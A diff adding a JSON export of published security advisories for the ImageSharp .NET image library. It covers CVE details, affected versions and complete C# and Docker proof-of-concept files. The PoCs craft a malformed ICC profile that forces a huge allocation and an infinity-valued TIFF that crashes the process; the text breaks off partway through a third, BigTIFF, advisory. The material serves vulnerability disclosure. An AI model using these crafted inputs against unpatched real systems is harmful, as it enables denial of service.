@@ -1,0 +1,1971 @@
+{
+  "advisories": [
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106114",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-789"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-789",
+          "name": "Memory Allocation with Excessive Size Value"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.2**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.2 or later.\n\n### Summary\n\nA malformed embedded ICC profile can make ImageSharp allocate memory from attacker-controlled CLUT channel and grid dimensions before verifying that the declared CLUT values are present.\n\nIn affected published v1, v2, and v3 packages before 3.2.0, the public lazy ICC parser allocates approximately 115 MB from the 200-byte test profile before rejecting the truncated tag. In affected published v4 packages from 4.0.0 through 4.1.1, decoding with ICC conversion enabled requests an 860,934,420-byte managed float array from the same profile.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected ranges: `>= 1.0.0-beta0001, < 3.2.0` and `>= 4.0.0, < 4.1.2`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nThe parser defect affects versions from `1.0.0-beta0001` up to, but not including, `3.2.0`, and v4 versions from `4.0.0` up to, but not including, `4.1.2`. The automatic `Image.Load` conversion path used by the main PoC exists in `>= 4.0.0, <= 4.1.1`; earlier versions expose the same parser defect through the public `IccProfile.Entries` accessor.\n### Details\n\nThe reproduced profile has an `A2B0` multi-process-elements (`mpet`) tag with a\n`clut` element declaring 15 input channels, 15 output channels, and three grid\npoints per input channel. [`ReadClutF32`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/ICC/DataReader/IccDataReader.Lut.cs#L139-L162)\ncomputes `3^15 * 15` and allocates that many floats before reading any CLUT\nvalues or verifying that the tag has enough remaining data. The supplied\n200-byte profile ends immediately after the CLUT grid descriptor.\n\nIn v4, the path is reached when an application decodes an embedded ICC profile using\n`DecoderOptions.ColorProfileHandling = ColorProfileHandling.Convert`. The\ndefault setting, `Preserve`, does not parse the profile for conversion.\n\nIn affected v1, v2, and v3 versions before 3.2.0, `ReadClutF32` uses a jagged representation. Loading an ICC-bearing JPEG and then accessing `decoded.Metadata.IccProfile.Entries` reaches the public lazy parser. The malformed profile allocates the `3^15`-entry outer array before the missing CLUT values are detected.\n\n### Reproduction environment and result\n\nThe supplied automatic-conversion exploit and control were run against the published NuGet 4.1.1\n`net8.0` DLL in Docker on Debian 12 / Linux arm64 with .NET SDK 8.0.424 and\n.NET runtime 8.0.30. The same conversion fixture was run against published 4.0.0 and 4.1.0 with the same result.\n\nPublished 1.0.0, 2.0.0, 2.1.13, 3.0.0, and 3.1.12 were tested through public JPEG decode followed by `IccProfile.Entries`; each allocated approximately 114.9 MB, skipped the malformed tag, and exited normally. The published `1.0.0-beta0001` public `IccProfile(bytes).Entries` path allocated 114,813,528 bytes before a catchable managed bounds exception.\n\nOne exploit decode increased `GC.GetTotalAllocatedBytes(true)` by approximately\n861.5 million bytes, then returned\n`InvalidIccProfileException: Invalid conversion method`.\nThe reader catches the truncated-tag error and drops that tag. The identical\ninput with `ColorProfileHandling.Preserve` completed successfully with roughly\n0.5 million allocated bytes in the harness.\n\nOne complete exploit run produced:\n\n```text\nmode=exploit profile_bytes=200 requested_float_array=215233605 requested_bytes=860934420\nimagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll\nimagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\nobserved_exception=SixLabors.ImageSharp.Metadata.Profiles.Icc.InvalidIccProfileException: Invalid conversion method.\nmanaged_bytes_allocated=861476416\nDocker exit status: 0\n```\n\nThe control from the same image produced:\n\n```text\nmode=control profile_bytes=200 requested_float_array=215233605 requested_bytes=860934420\nimagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll\nimagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\ndecoded=1x1 icc_present=True\nmanaged_bytes_allocated=511888\nDocker exit status: 0\n```\n\nThe exact allocation counter includes runtime allocations and varies slightly\nbetween processes; the requested CLUT array itself is 860,934,420 bytes.\n\nNo active exploitation is known.\n\n### Impact\n\nThis report demonstrates a large attacker-controlled transient allocation in\nthe ICC conversion path. It does not demonstrate unhandled process termination:\nallocation failure is caught while parsing the malformed tag, so the impact\nshould be limited to memory pressure / input-validation failure unless a\nreproduction demonstrates a stronger result.\n\n\n### Complete PoC files\n\nProgram.cs:\n\n```csharp\nusing System;\nusing System.Buffers.Binary;\nusing System.IO;\nusing System.Reflection;\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.Formats;\nusing SixLabors.ImageSharp.Formats.Png;\nusing SixLabors.ImageSharp.Metadata.Profiles.Icc;\nusing SixLabors.ImageSharp.PixelFormats;\n\nstatic class Program\n{\n    private const int RequestedFloats = 215233605; // 3^15 * 15\n    private const int RequestedBytes = RequestedFloats * sizeof(float);\n\n    private static void U32(byte[] bytes, int offset, uint value) => BinaryPrimitives.WriteUInt32BigEndian(bytes.AsSpan(offset, 4), value);\n    private static void U16(byte[] bytes, int offset, ushort value) => BinaryPrimitives.WriteUInt16BigEndian(bytes.AsSpan(offset, 2), value);\n    private static void Ascii(byte[] bytes, int offset, string value) { for (int i = 0; i < value.Length; i++) bytes[offset + i] = (byte)value[i]; }\n\n    // ICC v4 RGB profile containing an A2B0 mpet tag whose CLUT is deliberately\n    // truncated after its grid descriptor. ReadClutF32 still sizes float[] from\n    // the 15 untrusted input/output channels and the grid value of three.\n    private static byte[] BuildTruncatedProfile()\n    {\n        const int tagOffset = 144;\n        const int elementOffset = 168;\n        byte[] profile = new byte[200];\n        U32(profile, 0, (uint)profile.Length);\n        Ascii(profile, 4, \"test\");\n        U32(profile, 8, 0x04000000);\n        U32(profile, 12, 0x6D6E7472); // display device\n        U32(profile, 16, 0x52474220); // RGB\n        U32(profile, 20, 0x58595A20); // XYZ\n        Ascii(profile, 36, \"acsp\");\n        U32(profile, 128, 1);\n        U32(profile, 132, 0x41324230); // A2B0\n        U32(profile, 136, tagOffset);\n        U32(profile, 140, 56);\n        U32(profile, tagOffset, 0x6D706574); // mpet\n        U16(profile, tagOffset + 8, 0);\n        U16(profile, tagOffset + 10, 0);\n        U32(profile, tagOffset + 12, 1);\n        U32(profile, tagOffset + 16, 24); // element offset relative to tag start\n        U32(profile, tagOffset + 20, 32);\n        U32(profile, elementOffset, 0x636C7574); // clut\n        U16(profile, elementOffset + 4, 15);\n        U16(profile, elementOffset + 6, 15);\n        for (int i = 0; i < 15; i++) profile[elementOffset + 8 + i] = 3;\n        return profile;\n    }\n\n    private static byte[] BuildPng(byte[] icc)\n    {\n        using var image = new Image<Rgba32>(1, 1);\n        image.Metadata.IccProfile = new IccProfile(icc);\n        using var output = new MemoryStream();\n        image.Save(output, new PngEncoder());\n        return output.ToArray();\n    }\n\n    public static int Main(string[] args)\n    {\n        string mode = args.Length == 1 ? args[0] : \"exploit\";\n        if (mode is not (\"exploit\" or \"control\")) throw new ArgumentException(\"mode must be exploit or control\");\n        Console.WriteLine($\"mode={mode} profile_bytes=200 requested_float_array={RequestedFloats} requested_bytes={RequestedBytes}\");\n        Console.WriteLine($\"imagesharp_assembly={typeof(Image).Assembly.Location}\");\n        Console.WriteLine($\"imagesharp_version={typeof(Image).Assembly.GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion}\");\n        long before = GC.GetTotalAllocatedBytes(true);\n        try\n        {\n            byte[] png = BuildPng(BuildTruncatedProfile());\n            var options = new DecoderOptions\n            {\n                ColorProfileHandling = mode == \"exploit\" ? ColorProfileHandling.Convert : ColorProfileHandling.Preserve\n            };\n            using Image decoded = Image.Load(options, png);\n            Console.WriteLine($\"decoded={decoded.Width}x{decoded.Height} icc_present={decoded.Metadata.IccProfile is not null}\");\n        }\n        catch (Exception exception)\n        {\n            Console.WriteLine($\"observed_exception={exception.GetType().FullName}: {exception.Message}\");\n        }\n        Console.WriteLine($\"managed_bytes_allocated={GC.GetTotalAllocatedBytes(true) - before}\");\n        return 0;\n    }\n}\n\n```\n\nProject file:\n\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>net8.0</TargetFramework>\n    <ImplicitUsings>disable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n  <ItemGroup>\n    <Reference Include=\"SixLabors.ImageSharp\">\n      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>\n      <Private>true</Private>\n    </Reference>\n    <Reference Include=\"System.IO.Hashing\">\n      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>\n      <Private>true</Private>\n    </Reference>\n  </ItemGroup>\n</Project>\n\n```\n\nDockerfile:\n\n```dockerfile\nFROM mcr.microsoft.com/dotnet/sdk:8.0\nWORKDIR /work\nCOPY gwg2.csproj Program.cs ./\n# Restore only to obtain the published package. The repro project then uses a\n# direct DLL reference so ImageSharp's package build target is not invoked.\nRUN printf '%s\\n' '<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include=\"SixLabors.ImageSharp\" Version=\"4.1.1\" /></ItemGroup></Project>' > fetch.csproj \\\n    && dotnet restore fetch.csproj --nologo \\\n    && rm fetch.csproj \\\n    && dotnet build gwg2.csproj -c Release --nologo -v quiet\nENTRYPOINT [\"dotnet\", \"/work/bin/Release/net8.0/gwg2.dll\"]\n\n```\n\nRun:\n\n```sh\ndocker build -t imagesharp-gwg2-poc .\ndocker run --rm imagesharp-gwg2-poc exploit\ndocker run --rm imagesharp-gwg2-poc control\n```",
+      "ghsa_id": "GHSA-gwg2-r3hj-4w44",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-gwg2-r3hj-4w44",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-gwg2-r3hj-4w44"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106114"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:21:39Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "ICC CLUT parsing allocates from unvalidated channel and grid dimensions",
+      "updated_at": "2026-10-09T11:34:05Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-gwg2-r3hj-4w44",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 1.0.0-beta0001, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106113",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.2**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.2 or later.\n\n### Summary\n\n`SixLabors.ImageSharp` can terminate a process when an application decodes\nan attacker-supplied 32-bit floating-point TIFF as `Image<HalfVector4>` and applies\n`HistogramEqualization()`. An IEEE positive-infinity TIFF sample reaches a non-finite or otherwise out-of-range\n`HalfVector4` component, depending on the release. The histogram equalization path derives a luminance-based\nhistogram index without validating that result, reaching an unsafe out-of-range\naccess.\n\nThis report covers `HistogramEqualization` only. It does not claim Adaptive\nHistogram Equalization or AutoLevel behavior.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected ranges: `>= 2.0.0, < 3.2.0` and `>= 4.0.0, < 4.1.2`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nTIFF decoding first shipped in v2.0.0; v1.0.4 has no TIFF decoder. The unsafe luminance-derived histogram index affects versions from v2.0.0 up to, but not including, v3.2.0, and v4 versions from v4.0.0 up to, but not including, v4.1.2. The positive-infinity TIFF PoC terminates published 2.0.0, 3.1.12, 4.0.0, and 4.1.1 with `AccessViolationException`, while the finite `0.5` control completes on each tested release.\n### Details\n\n[`ColorNumerics.GetBT709Luminance`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Common/Helpers/ColorNumerics.cs#L24-L30) can produce a luminance that does not map to a valid histogram index. [`GrayscaleLevelsRowOperation.Invoke`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Processing/Processors/Normalization/GrayscaleLevelsRowOperation%7BTPixel%7D.cs#L47-L62) then uses that result as an unchecked `Unsafe.Add` offset into the histogram.\n\nThe reproduction reaches this code through the public `HistogramEqualization()` extension. It does not test or claim the Adaptive Histogram Equalization or `AutoLevel` paths.\n\n### Tested environment\n\nThe reproduction uses the DLL in the published NuGet 4.1.1 package:\n\n```text\nSixLabors.ImageSharp.dll SHA-256:\nc50231b527153cd9103acf03536a743958b3d892cc98cf9c05c9bcedef63ba0f\nRuntime: .NET 8.0.30 (linux-arm64)\nSDK: 8.0.424\nOS: Debian GNU/Linux 12 (bookworm), Docker\n```\n\n### Reproduction\n\nBuild the supplied Dockerfile and run the exploit. The harness creates a valid\n8x1 uncompressed, 32-bit IEEE floating-point TIFF whose samples are positive infinity,\ndecodes it through the public API, and invokes `HistogramEqualization()`.\n\nObserved result:\n\n```text\nmode=exploit tiffBytes=166 sample=Infinity\ndecoded=8x1 pixel=<Infinity, Infinity, Infinity, 1>\nFatal error. System.AccessViolationException: Attempted to read or write protected memory.\n...\nat SixLabors.ImageSharp.Processing.Processors.Normalization.GrayscaleLevelsRowOperation`1.Invoke\n...\nat SixLabors.ImageSharp.Processing.HistogramEqualizationExtensions.HistogramEqualization\nDocker exit status: 133\n```\n\nThe control is identical except samples are `0.5`:\n\n```text\nmode=control tiffBytes=166 sample=0.5\ndecoded=8x1 pixel=<0.5, 0.5, 0.5, 1>\ncompleted\nDocker exit status: 0\n```\n\nWhen the same exploit binary was invoked through a shell inside the container,\nthe shell printed `Aborted` and reported status 134. The direct `docker run`\nresult above is the result for the supplied Docker commands.\n\nNo active exploitation is known.\n\n\n### Complete PoC files\n\nProgram.cs:\n\n```csharp\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.PixelFormats;\nusing SixLabors.ImageSharp.Processing;\n\nstatic class Program\n{\n    private static void AddEntry(List<byte> ifd, ushort tag, ushort type, uint count, uint value)\n    {\n        ifd.AddRange(BitConverter.GetBytes(tag));\n        ifd.AddRange(BitConverter.GetBytes(type));\n        ifd.AddRange(BitConverter.GetBytes(count));\n        ifd.AddRange(BitConverter.GetBytes(value));\n    }\n\n    // Valid, uncompressed 8x1 grayscale TIFF containing 32-bit IEEE float samples.\n    private static byte[] BuildTiff(float sample)\n    {\n        const int width = 8;\n        const int entries = 10;\n        const int ifdOffset = 8;\n        const int pixelOffset = ifdOffset + 2 + (entries * 12) + 4;\n        List<byte> file = [0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00];\n        List<byte> ifd = [];\n        ifd.AddRange(BitConverter.GetBytes((ushort)entries));\n        const ushort Short = 3, Long = 4;\n        AddEntry(ifd, 256, Long, 1, width);             // ImageWidth\n        AddEntry(ifd, 257, Long, 1, 1);                 // ImageLength\n        AddEntry(ifd, 258, Short, 1, 32);               // BitsPerSample\n        AddEntry(ifd, 259, Short, 1, 1);                // Compression = none\n        AddEntry(ifd, 262, Short, 1, 1);                // Photometric = BlackIsZero\n        AddEntry(ifd, 273, Long, 1, pixelOffset);       // StripOffsets\n        AddEntry(ifd, 277, Short, 1, 1);                // SamplesPerPixel\n        AddEntry(ifd, 278, Long, 1, 1);                 // RowsPerStrip\n        AddEntry(ifd, 279, Long, 1, width * 4);         // StripByteCounts\n        AddEntry(ifd, 339, Short, 1, 3);                // SampleFormat = IEEE float\n        ifd.AddRange([0, 0, 0, 0]);\n        file.AddRange(ifd);\n        for (int i = 0; i < width; i++)\n        {\n            file.AddRange(BitConverter.GetBytes(sample));\n        }\n\n        return file.ToArray();\n    }\n\n    private static void Main(string[] args)\n    {\n        string mode = args.FirstOrDefault() ?? \"exploit\";\n        float sample = mode == \"control\" ? 0.5F : float.PositiveInfinity;\n        byte[] tiff = BuildTiff(sample);\n        Console.Error.WriteLine($\"mode={mode} tiffBytes={tiff.Length} sample={sample}\");\n\n        using Image<HalfVector4> image = Image.Load<HalfVector4>(tiff);\n        Console.Error.WriteLine($\"decoded={image.Width}x{image.Height} pixel={image[0, 0].ToScaledVector4()}\");\n        image.Mutate(x => x.HistogramEqualization());\n        Console.Error.WriteLine(\"completed\");\n    }\n}\n\n```\n\nProject file:\n\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>net8.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n  <!-- Directly load the DLL packaged by the published NuGet 4.1.1 release. -->\n  <ItemGroup>\n    <Reference Include=\"SixLabors.ImageSharp\">\n      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>\n    </Reference>\n    <Reference Include=\"System.IO.Hashing\">\n      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>\n    </Reference>\n  </ItemGroup>\n</Project>\n\n```\n\nDockerfile:\n\n```dockerfile\nFROM mcr.microsoft.com/dotnet/sdk:8.0\nWORKDIR /work\nCOPY j3p4.csproj Program.cs ./\nRUN printf '%s\\n' '<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include=\"SixLabors.ImageSharp\" Version=\"4.1.1\" /></ItemGroup></Project>' > fetch.csproj \\\n    && dotnet restore fetch.csproj --nologo \\\n    && rm fetch.csproj \\\n    && dotnet build j3p4.csproj -c Release --nologo -v quiet\nENTRYPOINT [\"dotnet\", \"/work/bin/Release/net8.0/j3p4.dll\"]\n\n```\n\nRun:\n\n```sh\ndocker build -t imagesharp-j3p4-poc .\ndocker run --rm imagesharp-j3p4-poc exploit\ndocker run --rm imagesharp-j3p4-poc control\n```\n",
+      "ghsa_id": "GHSA-j3p4-wp97-rph4",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-j3p4-wp97-rph4",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-j3p4-wp97-rph4"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106113"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:21:44Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "HistogramEqualization uses an unvalidated luminance as an unchecked histogram index",
+      "updated_at": "2026-10-09T11:35:17Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-j3p4-wp97-rph4",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 2.0.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106116",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-835"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-835",
+          "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.2**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.2 or later.\n\n### Summary\n\n`SixLabors.ImageSharp` 4.1.1 can spend an attacker-controlled duration decoding a\nsmall malformed BigTIFF. The BigTIFF IFD entry-count field is 64-bit. The reader\niterates once per declared entry, but when fewer than 20 bytes remain for an entry,\nthe entry read returns without advancing. A 24-byte input can therefore run billions\nof iterations without consuming input.\n\nOne decoder invocation occupied one executing thread for more than five seconds in\nthe tested environment. This report makes no worker-pool exhaustion claim.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected ranges: `>= 2.0.0, < 3.2.0` and `>= 4.0.0, < 4.1.2`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nBigTIFF decoding and the unbounded `ReadValues64` loop first appear in v2.0.0. Releases from v2.0.0 up to, but not including, v3.2.0, and v4 releases from v4.0.0 up to, but not including, v4.1.2 retain that loop without constraining the entry count or terminating when a truncated entry makes no progress. The 24-byte PoC exceeded the five-second timeout on published v2.0.0 and v4.1.1; the one-entry control returned promptly on both.\n### Details\n\n[`ReadValues64`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/Exif/ExifReader.cs#L220-L231) trusts the 64-bit IFD count and loops once per declared entry. When fewer than 20 bytes remain, [`ReadValue64`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/Exif/ExifReader.cs#L439-L444) returns without advancing the stream or ending the outer loop.\n\n### Tested environment\n\nThe reproduction uses the DLL in the published NuGet 4.1.1 package:\n\n```text\nSixLabors.ImageSharp.dll SHA-256:\nc50231b527153cd9103acf03536a743958b3d892cc98cf9c05c9bcedef63ba0f\nRuntime: .NET 8.0.30 